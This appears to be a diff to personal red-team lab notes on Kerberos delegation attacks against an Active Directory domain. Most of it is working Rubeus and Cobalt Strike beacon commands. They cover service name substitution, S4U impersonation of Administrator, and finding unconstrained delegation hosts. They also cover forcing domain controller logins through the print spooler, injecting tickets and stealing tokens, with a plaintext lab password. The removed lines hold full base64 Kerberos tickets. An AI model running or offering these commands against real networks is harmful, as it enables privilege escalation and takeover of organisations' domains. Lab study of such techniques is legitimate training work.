@@ -48,15 +48,46 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /pr
 steal_token PID
 ls \\
 actions
+-----------------------------------
+Service Name Substitution 
 
-execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /msdsspn:cifs/lon-dc-1.contoso.com /ticket:doIFjDCCBYigAwIBBaEDAgEWooIEoDCCBJxhggSYMIIElKADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBFowggRWoAMCARKhAwIBAqKCBEgEggREY9DINw63t+m46YX0AoN7dNYNhVAI6F4ijOCejwLXOU8wBrgZGFa0qHbRVkWRstVuBdjW9FeSEfWmvgNzaYWbi49XM6ZyPeOVQjvXGRRjvOKx/b4pIKXsbvRK3wF9VcNkFWJHDCRxzbllng9ov5PVSI0+Axq9ITw+BckplNE+XU09hIA1MXVInmM1HoHt4u7qsuJt5UV7Uuh/0lpQ5y3tSqpN+EJC3nKefDklExCe21rYJEIqDYL0WIEHupzJUOWM+G5LWSxGxfMZRLagdeypQ0pLb6C4Do4GLL8XkcJFTpnmNvvGVUYdoGXZW2A3TeR0EACnKZW9l9ky0UYd6w/T5FKy5Q/iJWz1huKAhASBC8yFY8xL5ki9Q/ZH8jXxltCLSwBNYJHgT/Gh93eof44eB9gG4P8Y5jd77SOK+PB4YS1Xq1ZyJKALt1bAXNtlcUpRS2trc7bLJxh38PFSz2E3vC97CsBDX0fcy+FRJfxcjlWsUwz2MuVKf4MMYT9ZIj+y+VI9mIAP6JKLqDT0B8LgMKEE4ORAQ5b8CyYTISpMLVxW+VXMNy1uYdCtSPuIFpFI7KlAHQX3fMy/s8nk2LeDj2MPjnciLQuxB2IXEElHG0T3TDqiRSQ3clF9gRAyRS3HvjK1YPXbTFDzVXx5AF5GvGVG/CNHFFgLCUo+xcMOTttKXE4OnO8rlwApJ9i7ZPQdtF1mUn4MWzZrjBU4z+T4Q9fMu8xyq78iyFGIWiTNvj6VWLjVASseS8Hk459uAQ/SkB80K7ez8P6yrbHbacUJK/Mh9GiKimSXKN17Ab+DAkfw6YusrvFSxt7fl6nqXbUYiYkdHV6nN9zKlIejP2dKEa4pozCWphqTa6k1BnEjdETVBw7hl1Jwc/KucamdxcTHsirB1EyvY1tWss0GqmPyI3HtVBC5rPMEvLOQf6Nsms2chJjpMsDXIUgeX3k//9ekvN8f1rjtD0IF+PveLX60l2ezQRoYJbbzzG48AUTOl7hQkplbpBRzaCUxPKb5GktYudwkdXVO4JcIzuOHYckUpSAc+slFuNY5y9EqaTHWqbsOk5srU6SwHS7n0ecNbhz0RLW9Y+mhrwEP0etMbI+RkVDv8FGasiYOQAZ7y6Bo2YBtCHzSNcjnFIdP19ztd4Nua8Phjw3ohsXtT2+CZ8k03jQ7cm328O8KIYd4J5raB2q+UPleO64REtUDAUzMpSzrCBv7JrUQOGta2Y1ttHcsmCxtU1d679t3ePRIDNorA21yJhYI8hzWGTAJku7fLivovco3G2efFsyO3Kb0XsUaS6C43kuEWY/JCHWrAHnxwZs2GBOZDTkMHUDv6KlDVSXosZZTMiXFs7vdIqiDNlFf6jsO4JElrg+zJxEy0hqts/iyYHsqoZdtJ9g7WgTh1hAZpCuXAA/yK7O4UjHfrVo8CClFMH34oPeOb6Nu7aI3NwpJasL7o4HXMIHUoAMCAQCigcwEgcl9gcYwgcOggcAwgb0wgbqgGzAZoAMCARehEgQQGfyc7iDoJM8NsGBz9EEybqENGwtDT05UT1NPLkNPTaIZMBegAwIBAaEQMA4bDExPTi1XS1NUTi0xJKMHAwUAYKEAAKURGA8yMDI1MDkwMjAxMDc1NFqmERgPMjAyNTA5MDIxMDU4MjNapxEYDzIwMjUwOTA5MDA1ODIzWqgNGwtDT05UT1NPLkNPTakgMB6gAwIBAqEXMBUbBmtyYnRndBsLQ09OVE9TTy5DT00=/impersonateuser:Administrator /nowrap /ptt
-execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket: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
-
-
-LON-WKSTN-1$
-
-
-
-
-Constrained Delegation.
+Service Name Substitution is a technique that allows an adversary to "swap" a service ticket for one service, to another service.
+ie. time to cifs
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:time/lon-dc-1 /altservice:cifs /ticket:doIFn[...snip...]5DT00= /impersonateuser:Administrator /nowrap
+Where:
+/user is the principal (e.g. computer) configured for the delegation.
+/msdsspn is the service that the principal is allowed to delegate to.
+/altservice is the service to substitute into the final ticket.
+/ticket is the TGT for the principal.
+/impersonateuser is the user we want to impersonate.
+The altservice parameter actually takes a comma-separated list of services, e.g. /altservice:cifs,host,http.  This will produce 3 new tickets that you can inject.
 Role-Based Constrained Delegation.
+
+Steps
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap 
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:time/lon-dc-1 /altservice:cifs /ticket:doIFn[...snip...]5DT00= /impersonateuser:Administrator /nowrap
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:doIGf[...snip...]RjLTE=
+steal_token #pid
+
+--------------------------------------
+
+S4U2self
+
+Find unconstrained delegation
+ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
+
+make_token CONTOSO\rsteel Passw0rd!
+jump psexec64 lon-ws-1 smb <-- High integrity
+
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap <-- monitor for dc user
+execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1 < -- Force logins with spooler (look at petite potam as well)
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/lon-dc-1 /ticket:[TGT] /nowrap <-- impersonate with self
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket: <-- inject
+Steal_token Pid
+run klist validate
+actions
+
+
+
+
+
